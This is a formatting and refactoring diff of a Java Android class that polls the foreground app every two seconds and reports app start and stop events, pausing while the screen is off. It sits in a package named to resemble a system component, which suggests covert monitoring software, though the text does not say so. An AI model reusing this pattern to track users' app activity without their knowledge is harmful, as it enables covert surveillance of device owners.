@@ -9,10 +9,6 @@
 
 package com.android.syssetup.listener;
 
-import java.util.concurrent.ScheduledExecutorService;
-import java.util.concurrent.ScheduledFuture;
-import java.util.concurrent.TimeUnit;
-
 import com.android.syssetup.ProcessInfo;
 import com.android.syssetup.ProcessStatus;
 import com.android.syssetup.Standby;
@@ -22,27 +18,40 @@ import com.android.syssetup.interfaces.Observer;
 import com.android.syssetup.util.Check;
 import com.android.syssetup.util.StringUtils;
 
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.ScheduledFuture;
+import java.util.concurrent.TimeUnit;
+
 public class ListenerProcess extends Listener<ProcessInfo> implements Observer<Standby> {
-	/** The Constant TAG. */
+	/**
+	 * The Constant TAG.
+	 */
 	private static final String TAG = "ListenerProcess"; //$NON-NLS-1$
 	private static final long PERIOD = 2000;
-
+	/**
+	 * The singleton.
+	 */
+	private volatile static ListenerProcess singleton;
 	String lastForeground = "";
-
-	private boolean started;
 	BroadcastMonitorProcess bmp = new BroadcastMonitorProcess();
-
+	private boolean started;
 	private Object standbyLock = new Object();
 	private Object startedLock = new Object();
-
-	/** The singleton. */
-	private volatile static ListenerProcess singleton;
 	private ScheduledFuture<?> future;
 	private ScheduledExecutorService stpe = Status.getStpe();
 
+	public ListenerProcess() {
+		super();
+
+		synchronized (standbyLock) {
+			ListenerStandby.self().attach(this);
+			setSuspended(!ListenerStandby.isScreenOn());
+		}
+	}
+
 	/**
 	 * Self.
-	 * 
+	 *
 	 * @return the status
 	 */
 	public static ListenerProcess self() {
@@ -53,17 +62,8 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 				}
 			}
 		}
-		
+
 		return singleton;
-	}
-
-	public ListenerProcess() {
-		super();
-
-		synchronized (standbyLock) {
-			ListenerStandby.self().attach(this);
-			setSuspended(!ListenerStandby.isScreenOn());
-		}
 	}
 
 	@Override
@@ -75,11 +75,11 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (start)");
 					}
-					
+
 					started = true;
 					this.future = stpe.scheduleAtFixedRate(bmp, this.PERIOD, this.PERIOD, TimeUnit.MILLISECONDS);
 
-				}else{
+				} else {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (start): screen off");
 						setSuspended(true);
@@ -101,7 +101,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (stop)");
 				}
-				
+
 				started = false;
 
 				if (this.future != null) {
@@ -117,21 +117,21 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 		}
 
 	}
-	
-	public synchronized boolean isRunning(String appName){
+
+	public synchronized boolean isRunning(String appName) {
 		return lastForeground.equals(appName);
 	}
 
 	protected synchronized int dispatch(String currentForeground) {
-	
-		if(!currentForeground.equals(lastForeground)){
+
+		if (!currentForeground.equals(lastForeground)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): started " + currentForeground);
 				Check.log(TAG + " (notification): lastForeground " + lastForeground);
 			}
 			dispatch(new ProcessInfo(currentForeground, ProcessStatus.START));
 
-			if(!StringUtils.isEmpty(lastForeground)){
+			if (!StringUtils.isEmpty(lastForeground)) {
 				super.dispatch(new ProcessInfo(lastForeground, ProcessStatus.STOP));
 			}
 
@@ -149,13 +149,13 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (notification): try to resume");
 				}
-				
+
 				resume();
 			} else {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (notification): try to suspend");
 				}
-				
+
 				suspend();
 			}
 		}
@@ -172,7 +172,7 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 		private static final String TAG = "BroadcastMonitorProcess"; //$NON-NLS-1$
 
 		@Override
-		public  void run() {
+		public void run() {
 
 			String foreground = Status.self().getForeground();
 			if (Cfg.DEBUG) {
@@ -181,6 +181,8 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 			dispatch(foreground);
 		}
 
-	};
+	}
+
+	;
 
 }
